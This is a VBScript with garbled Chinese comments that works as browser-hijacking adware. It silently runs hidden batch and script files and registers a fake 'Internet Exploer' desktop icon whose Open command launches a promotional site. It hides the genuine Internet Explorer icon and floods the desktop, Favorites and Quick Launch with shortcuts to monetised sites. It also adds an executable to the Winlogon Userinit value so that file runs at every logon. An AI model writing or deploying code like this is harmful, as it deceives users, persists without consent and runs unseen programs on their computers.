Dim WSHShell 
Set WshShell = WScript.CreateObject("WScript.Shell")
strDesktop = WshShell.SpecialFolders("Desktop") :'�����ļ��С����桱
Favorites = WshShell.SpecialFolders("Favorites") :'�����ļ��С����桱

on error resume next 

Rem
strWinDir = WshShell.ExpandEnvironmentStrings("%ProgramFiles%")
createobject("wscript.shell").run """"&strWinDir&"\systemfiles\3.bat""",0
iescc=strWinDir&"\Internet Explorer\iexplore.exe"
winds = WshShell.ExpandEnvironmentStrings("%SystemRoot%")
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\", "Internet Exploer"
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\DefaultIcon\", iescc
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\Shell\",""
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\Shell\D\", "ɾ��(&D)"
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\Shell\D\Command\", "Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl"
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\Shell\Open\", "������ҳ"
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\Shell\��"&"��\", "��"&"��"
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\Shell\��"&"��\Command\", "Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl"
WSHShell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{86AEFBE8-763F-0647-899C-A93278894D8E}""\", "Internet Exploer"
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\ShellFolder\",""


Rem 
Set oShellLink = WshShell.CreateShortcut(strDesktop & "\ǧǧ����ֱ��.lnk")
oShellLink.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : 'Ŀ��
oShellLink.Arguments = "http://www."&"77zb."&"com/?desk" :'����
oShellLink.WindowStyle = 1 :'����1Ĭ�ϴ��ڼ������3��󻯼������7��С��
oShellLink.IconLocation = "%ProgramFiles%\systemfiles\77zb.ico, 0" : 'ͼ��
oShellLink.Description = "" : '��ע
oShellLink.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '��ʼλ��
oShellLink.Save : '���������ݷ�ʽ
Set oShellLink = WshShell.CreateShortcut(strDesktop & "\�Ա������մ����ؼ���.lnk")
oShellLink.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : 'Ŀ��
oShellLink.Arguments = "http://www.223224.com/taobao/?desk" :'����
oShellLink.WindowStyle = 1 :'����1Ĭ�ϴ��ڼ������3��󻯼������7��С��
oShellLink.IconLocation = "%ProgramFiles%\systemfiles\taobao.ico, 0" : 'ͼ��
oShellLink.Description = "" : '��ע
oShellLink.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '��ʼλ��
oShellLink.Save : '���������ݷ�ʽ
Set oShellLink = WshShell.CreateShortcut(strDesktop & "\��������С��Ϸ.lnk")
oShellLink.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : 'Ŀ��
oShellLink.Arguments = "http://www.45575.com/?desk" :'����
oShellLink.WindowStyle = 1 :'����1Ĭ�ϴ��ڼ������3��󻯼������7��С��
oShellLink.IconLocation = "%ProgramFiles%\systemfiles\game.ico, 0" : 'ͼ��
oShellLink.Description = "" : '��ע
oShellLink.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '��ʼλ��
oShellLink.Save : '���������ݷ�ʽ
Set oShellLink = WshShell.CreateShortcut(strDesktop & "\��ѵ�Ӱ.lnk")
oShellLink.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : 'Ŀ��
oShellLink.Arguments = "http://www.kuku46.com/?we2" :'����
oShellLink.WindowStyle = 1 :'����1Ĭ�ϴ��ڼ������3��󻯼������7��С��
oShellLink.IconLocation = "%ProgramFiles%\systemfiles\kusila.ico, 0" : 'ͼ��
oShellLink.Description = "" : '��ע
oShellLink.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '��ʼλ��
oShellLink.Save : '���������ݷ�ʽ

Set oShellLink = WshShell.CreateShortcut(Favorites & "\ǧǧ����ֱ��.lnk")
oShellLink.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : 'Ŀ��
oShellLink.Arguments = "http://www."&"77zb."&"com/?fav" :'����
oShellLink.WindowStyle = 1 :'����1Ĭ�ϴ��ڼ������3��󻯼������7��С��
oShellLink.Hotkey = "" : '��ݼ�
oShellLink.IconLocation = "%ProgramFiles%\systemfiles\77zb.ico, 0" : 'ͼ��
oShellLink.Description = "" : '��ע
oShellLink.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '��ʼλ��
oShellLink.Save : '���������ݷ�ʽ
Set oShellLink = WshShell.CreateShortcut(Favorites & "\��Ʒ�����������.lnk")
oShellLink.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : 'Ŀ��
oShellLink.Arguments = "http://www.9ptv.com/?fav" :'����
oShellLink.WindowStyle = 1 :'����1Ĭ�ϴ��ڼ������3��󻯼������7��С��
oShellLink.Hotkey = "" : '��ݼ�
oShellLink.IconLocation = "%ProgramFiles%\systemfiles\9ptv.ico, 0" : 'ͼ��
oShellLink.Description = "" : '��ע
oShellLink.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '��ʼλ��
oShellLink.Save : '���������ݷ�ʽ
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\�Ա��� - �ԣ���ϲ��.url")
oUrlLink.TargetPath = "http://www."&"77zb."&"com/"&"taobao/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\��Ȥ�� - Ʒ��������������Ȥ.url")
oUrlLink.TargetPath = "http://www.82vv.com/yq/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\������ �C ȫ�����������������&��������.url")
oUrlLink.TargetPath = "http://www.82vv.com/dd/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\׿Խ����ѷ���Ϲ���ͼ�飬�ֻ������룬�ҵ磬��ױƷ���ӱ����ε���������.url")
oUrlLink.TargetPath = "http://www.82vv.com/zy/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\�������Ӿ磬������õ���ɫ��ѵ��Ӿ���վ.url")
oUrlLink.TargetPath = "http://www.kkdsj.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\45575����С��Ϸ�����������С��Ϸ.url")
oUrlLink.TargetPath = "http://www.45575.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\������ɫ��ѵ�Ӱ�����ٸ��壡������£�����.url")
oUrlLink.TargetPath = "http://www.kuku46.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\��Ʒ�����崿д�棡����ͼ�󼯺ϣ�.url")
oUrlLink.TargetPath = "http://www.ysr3.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\��ɫ��������ͼ���������������۹����ͣ�.url")
oUrlLink.TargetPath = "http://mm.jiewen5.com/?fav"
oUrlLink.Save

WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\ShellFolder\Attributes",10,"REG_DWORD"
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\Shell\Open\Command\", iescc&" http://www.552dh.cn/?ca1"


Set oShellLink1 = WshShell.CreateShortcut(WshShell.SpecialFolders.Item("AppData")& "\Microsoft\Internet Explorer\Quick Launch"&"\��������С��Ϸ.lnk")  
oShellLink1.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : 'Ŀ��
oShellLink1.Arguments = "http://www.45575.com/?desk" :'����
oShellLink1.WindowStyle = 1 :'����1Ĭ�ϴ��ڼ������3��󻯼������7��С��
oShellLink1.IconLocation = "%ProgramFiles%\systemfiles\game.ico, 0" : 'ͼ��
oShellLink1.Description = "" : '��ע
oShellLink1.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '��ʼλ��
oShellLink1.Save : '���������ݷ�ʽ
Set oShellLink1 = WshShell.CreateShortcut(WshShell.SpecialFolders.Item("AppData")& "\Microsoft\Internet Explorer\Quick Launch"&"\�Ա������մ����ؼ���.lnk")  
oShellLink1.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : 'Ŀ��
oShellLink1.Arguments = "http://www.223224.com/taobao/?desk" :'����
oShellLink1.WindowStyle = 1 :'����1Ĭ�ϴ��ڼ������3��󻯼������7��С��
oShellLink1.IconLocation = "%ProgramFiles%\systemfiles\taobao.ico, 0" : 'ͼ��
oShellLink1.Description = "" : '��ע
oShellLink1.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '��ʼλ��
oShellLink1.Save : '���������ݷ�ʽ
Set oShellLink1 = WshShell.CreateShortcut(WshShell.SpecialFolders.Item("AppData")& "\Microsoft\Internet Explorer\Quick Launch"&"\ǧǧ����ֱ��.lnk")  
oShellLink1.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : 'Ŀ��
oShellLink1.Arguments = "http://www."&"77zb."&"com/?desk" :'����
oShellLink1.WindowStyle = 1 :'����1Ĭ�ϴ��ڼ������3��󻯼������7��С��
oShellLink1.IconLocation = "%ProgramFiles%\systemfiles\77zb.ico, 0" : 'ͼ��
oShellLink1.Description = "" : '��ע
oShellLink1.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '��ʼλ��
oShellLink1.Save : '���������ݷ�ʽ
Set oShellLink1 = WshShell.CreateShortcut(WshShell.SpecialFolders.Item("AppData")& "\Microsoft\Internet Explorer\Quick Launch"&"\��ѵ�Ӱ.lnk")  
oShellLink1.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : 'Ŀ��
oShellLink1.Arguments = "http://www.kuku46.com/?we2" :'����
oShellLink1.WindowStyle = 1 :'����1Ĭ�ϴ��ڼ������3��󻯼������7��С��
oShellLink1.IconLocation = "%ProgramFiles%\systemfiles\kusila.ico, 0" : 'ͼ��
oShellLink1.Description = "" : '��ע
oShellLink1.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '��ʼλ��
oShellLink1.Save : '���������ݷ�ʽ


'=========
Rem 
RegPath="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel\{871C5380-42A0-1069-A2EA-08002B30309D}"
RegPath1="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu\{871C5380-42A0-1069-A2EA-08002B30309D}"
Type_Name="REG_DWORD"
Key_Data=1
WshShell.RegWrite RegPath,Key_Data,Type_Name
WshShell.RegWrite RegPath1,Key_Data,Type_Name
Set WSHShell = WScript.CreateObject("WScript.Shell") 
strDesktop = WSHShell.SpecialFolders("Desktop") 
WSHShell.AppActivate strDesktop 
WSHShell.SendKeys "{F5}" 
WSHShell.SendKeys "{F5}"

createobject("wscript.shell").run """"&strWinDir&"\systemfiles\3.vbs""",0

WSHShell.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit",winds&"\system32\userinit.exe,"&strWinDir&"\systemfiles\sys32.exe"
wscript.quit